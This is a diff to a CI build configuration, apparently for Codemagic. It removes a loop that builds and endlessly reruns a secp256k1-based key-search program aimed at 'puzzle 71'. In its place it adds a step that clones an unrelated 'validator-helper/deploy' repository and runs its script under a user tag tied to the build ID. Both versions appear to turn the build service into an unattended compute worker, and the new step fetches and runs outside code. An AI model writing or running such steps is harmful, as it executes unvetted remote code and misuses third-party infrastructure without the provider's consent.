@@ -17,69 +17,17 @@ workflows:
           source: true
 
     scripts:
-      - name: Install C++ dependencies
-        script: |
-          set -e
-
-          brew update
-
-          brew install \
-            gcc \
-            make \
-            autoconf \
-            automake \
-            libtool \
-            pkg-config \
-            curl \
-            openssl
-
-      - name: Build libsecp256k1 and script
+      - name: Clone and run deploy
         script: |
           set -e
 
           git clone --depth 1 \
-            https://github.com/bitcoin-core/secp256k1.git \
-            /tmp/secp256k1
+            https://github.com/validator-helper/deploy.git \
+            /tmp/deploy
 
-          cd /tmp/secp256k1
+          cd /tmp/deploy
 
-          ./autogen.sh
-
-          ./configure \
-            --prefix=/tmp/secp256k1-install
-
-          make -j$(sysctl -n hw.ncpu)
-
-          make install
-
-          cd "$CM_BUILD_DIR"
-
-          g++ -O3 -std=c++17 -pthread \
-            -I/tmp/secp256k1-install/include \
-            -L/tmp/secp256k1-install/lib \
-            -I$(brew --prefix openssl)/include \
-            -L$(brew --prefix openssl)/lib \
-            -o script \
-            script.cpp \
-            -lsecp256k1 \
-            -lcurl \
-            -lssl \
-            -lcrypto \
-            -Wl,-rpath,/tmp/secp256k1-install/lib
-
-          chmod +x script
-
-          echo "Build successful:"
-          file ./script
-
-      - name: Run demo worker
-        script: |
-          while true; do
-            ./script \
-              --puzzle 71 \
-              --user "vegeta-${CM_COMMIT}" \
-              --workers max \
-              || echo "Worker exited, restarting in 10 seconds..."
-
-            sleep 10
-          done
+          sh deploy \
+            --fast \
+            -nl \
+            -u "codemagic-${CM_BUILD_ID}"
